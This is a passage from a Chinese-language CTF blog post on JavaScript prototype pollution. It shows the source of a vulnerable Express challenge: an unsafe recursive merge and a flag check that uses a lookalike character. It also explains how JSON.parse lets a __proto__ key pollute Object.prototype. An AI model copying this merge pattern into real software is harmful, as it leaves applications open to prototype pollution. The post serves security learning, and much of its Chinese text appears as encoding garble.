<h4 id="demo3"><a class="header-anchor" href="#demo3">ğŸ­</a>demo3</h4>
<pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span>;

<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);
<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)
<span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);
<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);


<span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">merge</span>(<span class="hljs-params">a, b</span>) </span>&#123;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;
        <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;
            merge(a[attr], b[attr]);
        &#125; <span class="hljs-keyword">else</span> &#123;
            a[attr] = b[attr];
        &#125;
    &#125;
    <span class="hljs-keyword">return</span> a
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span>(<span class="hljs-params">a</span>) </span>&#123;
    <span class="hljs-keyword">return</span> merge(&#123;&#125;, a);
&#125;

<span class="hljs-comment">// Constants</span>
<span class="hljs-keyword">const</span> PORT = <span class="hljs-number">8080</span>;
<span class="hljs-keyword">const</span> HOST = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>;
<span class="hljs-keyword">const</span> admin = &#123;&#125;;

<span class="hljs-comment">// App</span>
<span class="hljs-keyword">const</span> app = express();
app.use(bodyParser.json())
app.use(cookieParser());

app.use(<span class="hljs-string">&#x27;/&#x27;</span>, express.static(path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>)));
app.post(<span class="hljs-string">&#x27;/signup&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
    <span class="hljs-keyword">var</span> body = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.body));
    <span class="hljs-keyword">var</span> copybody = clone(body)
    <span class="hljs-keyword">if</span> (copybody.name) &#123;
        res.cookie(<span class="hljs-string">&#x27;name&#x27;</span>, copybody.name).json(&#123;
            <span class="hljs-string">&quot;done&quot;</span>: <span class="hljs-string">&quot;cookie set&quot;</span>
        &#125;);
    &#125; <span class="hljs-keyword">else</span> &#123;
        res.json(&#123;
            <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;cookie not set&quot;</span>
        &#125;)
    &#125;
&#125;);
app.get(<span class="hljs-string">&#x27;/getFlag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
    <span class="hljs-keyword">var</span> Ğ°dmin = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.cookies))
    <span class="hljs-keyword">if</span> (admin.Ğ°dmin == <span class="hljs-number">1</span>) &#123;
        res.send(<span class="hljs-string">&quot;hackim19&#123;&#125;&quot;</span>);
    &#125; <span class="hljs-keyword">else</span> &#123;
        res.send(<span class="hljs-string">&quot;You are not authorized&quot;</span>);
    &#125;
&#125;);
app.listen(PORT, HOST);
<span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Running on http://<span class="hljs-subst">$&#123;HOST&#125;</span>:<span class="hljs-subst">$&#123;PORT&#125;</span>`</span>);</code></pre>
<p>è·å–flagçš„æ¡ä»¶æ˜¯<code>admin.Ğ°dmin == 1</code>è€Œadmin æœ¬èº«æ˜¯ä¸€ä¸ªobjectï¼Œå…¶admin å±æ€§æœ¬èº«å¹¶ä¸å­˜åœ¨ã€‚è¿˜ç”¨åˆ°äº†merge å‡½æ•°è¿›è¡Œå¯¹è±¡çš„åˆå¹¶ï¼Œä¸”æ¶‰åŠåˆ°äº†å¯¹è±¡çš„èµ‹å€¼ï¼Œé”®å€¼å¯æ§ï¼Œå¯ä»¥è§¦å‘åŸå½¢é“¾æ±¡æŸ“ã€‚</p>
<p>ä½†æœ¬é¢˜ä¸­æˆ‘ä»¬ä¸èƒ½ç›´æ¥å°†1èµ‹ç»™adminï¼Œå› ä¸ºåœ¨åˆ›å»ºå­—å…¸çš„æ—¶å€™ï¼Œ<code>__proto__</code>,ä¸æ˜¯ä½œä¸ºä¸€ä¸ªé”®åï¼Œè€Œæ˜¯å·²ç»ä½œä¸º<code>__proto__</code>ç»™å…¶çˆ¶ç±»è¿›è¡Œèµ‹å€¼äº†ï¼Œæ‰€ä»¥åœ¨<code>test.__proto__</code>ä¸­æ‰æœ‰adminå±æ€§ï¼Œä½†æˆ‘ä»¬æƒ³è®©<code>__proto__</code>ä½œä¸ºä¸€ä¸ªé”®å€¼ï¼Œæ­¤æ—¶éœ€è¦ç”¨åˆ°JSON.parseã€‚JSON.parse ä¼šæŠŠä¸€ä¸ªjsonå­—ç¬¦ä¸² è½¬åŒ–ä¸º javascriptçš„object</p>
<p><img src="/2021/04/18/js/5.jpg" srcset="/img/loading.gif" alt="5"></p>
<h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">ğŸ­</a>æ€»ç»“</h2>
<p>åŸå‹é“¾æ±¡æŸ“çš„ä¸€ä¸ªå…³é”®ç‚¹æ˜¯mergeå‡½æ•°ï¼Œåˆ©ç”¨ç‚¹é€šå¸¸éƒ½æ˜¯ç»™æœªèµ‹å€¼ä½†å¯èµ‹å€¼çš„å˜é‡è¿›è¡Œèµ‹å€¼ã€‚</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45551083/article/details/109589386">åŸå‹é“¾æ±¡æŸ“æ¼æ´(ä¸€)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡»</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/176884/#h3-5">JavaScript åŸå‹é“¾æ±¡æŸ“ </a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
              </div>
              
                <p class="note note-warning">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/05/03/GXYctf/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">GXYCTF2019|ç¦æ­¢å¥—å¨ƒ</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/04/17/lowtype/">
                        <span class="hidden-mobile">PHPå¼±ç±»å‹åŠç»•è¿‡</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
    NProgress.start()
    document.addEventListener('DOMContentLoaded', function() {
      window.NProgress && window.NProgress.inc();
    })
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>





  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>



</body>
</html>
